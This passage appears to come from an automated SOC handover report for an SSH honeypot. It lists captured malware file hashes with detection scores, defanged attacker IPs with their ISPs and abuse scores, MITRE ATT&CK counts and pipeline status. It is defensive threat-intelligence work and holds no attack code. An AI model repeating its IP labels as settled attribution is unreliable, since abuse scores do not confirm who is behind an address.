| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `103.143.10[.]140` | US | HONG KONG ACEMOB TECHNOLOGY CO., LIMITED | **100** ⚠️ | 3 |
| `18.234.191[.]99` | US | Amazon Technologies Inc. | **100** ⚠️ | 11 |
| `212.73.148[.]28` | SG | NL MODAT | **100** ⚠️ | 50 |
| `116.233.39[.]105` | CN | CHINANET Shanghai province network | **100** ⚠️ | 0 |
| `185.247.137[.]96` | GB | Driftnet Ltd | **100** ⚠️ | 50 |
| `143.110.178[.]27` | IN | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `103.52.114[.]250` | ID | PT Cloud Hosting Indonesia | **100** ⚠️ | 50 |
| `14.103.123[.]232` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `13.94.39[.]162` | HK | Microsoft Corporation | **100** ⚠️ | 3 |
| `120.48.50[.]133` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 26 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 397 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 202 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 116 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 62 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 61 |

---

## 🔕 False Positive Summary (27 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 24 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 1356 cases |
| Tool 34  | Credential Extractor        | ✅ 318 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 55 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 27 filtered (2.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 37 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 116 priority case(s) shown individually · 47 recon entry/entries in table (24 group(s) consolidating 1190 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-09T14:59:50Z_
